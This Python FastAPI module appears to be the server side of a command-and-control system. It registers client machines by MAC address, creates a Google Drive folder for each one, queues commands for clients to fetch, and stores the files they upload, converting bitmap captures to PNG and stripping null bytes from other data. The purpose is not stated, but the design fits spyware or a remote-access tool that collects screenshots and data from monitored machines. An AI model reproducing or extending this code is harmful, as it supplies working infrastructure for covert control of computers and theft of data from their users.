from typing import List, Dict

from fastapi import Request, HTTPException, status
from PIL import Image

from driveapi import upload_file_from_existing_file, create_folder
from consts import HTTPHeaders, DBIdentifiers, MIMETypesExtensions
from db_utils import DBHandler

NO_COMMANDS = ['no_commands']
TEMP_FILE = 'temp'
db_handler = DBHandler()


def handle_first_command(request: Request) -> Dict[str, List[str]]:
    """
    If the client is new, initializes it in DB and creates Google Drive
     folder. Otherwise retrieves the command for the client from the DB.
    Args:
        request (Request): The request received from the client.

    Returns:
        Dict[str, List[str]]: the commands addressed to that client.
    """
    mac = request.headers[HTTPHeaders.MAC]
    datetime = request.headers[HTTPHeaders.DATETIME]
    if db_handler.db.get(mac) is None:
        # new client
        _create_new_client(mac, datetime)
        return {'commands': NO_COMMANDS}
    else:
        # existing client
        update_datetime(request)
        return _get_commands(mac)


def handle_command_request(request: Request) -> Dict[str, List[str]]:
    """
    Retrieves the commands for the client from the DB.
    Args:
        request (Request): The request received from the client.

    Returns:
         Dict[str, List[str]]: the commands addressed to the client.
    """
    mac = request.headers[HTTPHeaders.MAC]
    return _get_commands(mac)


async def upload_file(request: Request, filename: str, db_identifier: DBIdentifiers,
                      remove_nulls: bool = False) -> None:
    """
    Uploads the file content of the request to the (already created)
      Google Drive folder.
    Args:
        request (Request): The request received from the client.
        filename (str): The name of the file that will be uploaded.
        db_identifier (DBIdentifiers): The identifier in the DB which
          counts how many files of that name have been uploaded, so that
          the new file will be numbered.
        remove_nulls (bool): If set to True, removes all the null
         characters in the file. Defaults to False.
    Raises:
        HTTPException(415 Unsupported Media Type) - In case where the
         received MIME type is unsupported.
    """
    if not MIMETypesExtensions.has_value(request.headers[HTTPHeaders.CONTENT_TYPE]):
        raise HTTPException(status_code=status.HTTP_415_UNSUPPORTED_MEDIA_TYPE)
    if not DBIdentifiers.has_value(db_identifier):
        return  # illegal identifier

    mac = request.headers[HTTPHeaders.MAC]
    mime_type = await _write_to_temp_file(request, remove_nulls)
    title = _build_title(mac, filename, MIMETypesExtensions(mime_type).file_extension,
                         db_identifier)
    _increase_identifier(mac, db_identifier)
    upload_file_from_existing_file(title=title,
                                   src_filename=TEMP_FILE,
                                   mime_type=mime_type,
                                   parent_folder_title=mac)


def update_datetime(request: Request) -> None:
    """
    Updates the DB datetime for some client.
    Args:
        request: The request received from the client.
    """
    mac_address = request.headers[HTTPHeaders.MAC]
    datetime = request.headers[HTTPHeaders.DATETIME]
    db_handler.db[mac_address].last_datetime = datetime
    db_handler.update_db()


def _get_commands(mac_address: str) -> Dict[str, List[str]]:
    commands = db_handler.retrieve_commands_from_db(mac_address) or NO_COMMANDS
    return {'commands': commands}


def _create_new_client(mac: str, datetime: str) -> None:
    db_handler.initialize_new_client(mac, datetime)
    create_folder(mac)  # Create new Google Drive folder for the new client


async def _write_to_temp_file(request: Request, remove_nulls: bool) -> str:
    data = await request.body()
    if remove_nulls:
        data = data.replace(b'\x00', b'')
    with open(TEMP_FILE, 'wb') as f:
        f.write(data)
    if MIMETypesExtensions(cnt_type := request.headers[HTTPHeaders.CONTENT_TYPE]) \
            is MIMETypesExtensions.BMP:
        # reduce file size (by about 10-50 fold) by converting from bitmap to png
        _convert_temp_from_bmp_to_png()
        mime_type = MIMETypesExtensions.PNG.value
    else:
        mime_type = MIMETypesExtensions(cnt_type).value

    return mime_type


def _build_title(mac: str, filename: str, file_extension: str,
                 db_identifier: DBIdentifiers) -> str:
    return f'{filename}{getattr(db_handler.db[mac], db_identifier)}.{file_extension}'


def _increase_identifier(mac: str, db_identifier: DBIdentifiers) -> None:
    setattr(db_handler.db[mac], db_identifier,
            getattr(db_handler.db[mac], db_identifier) + 1)
    db_handler.update_db()


def _convert_temp_from_bmp_to_png():
    Image.open(TEMP_FILE).save(TEMP_FILE, 'PNG')
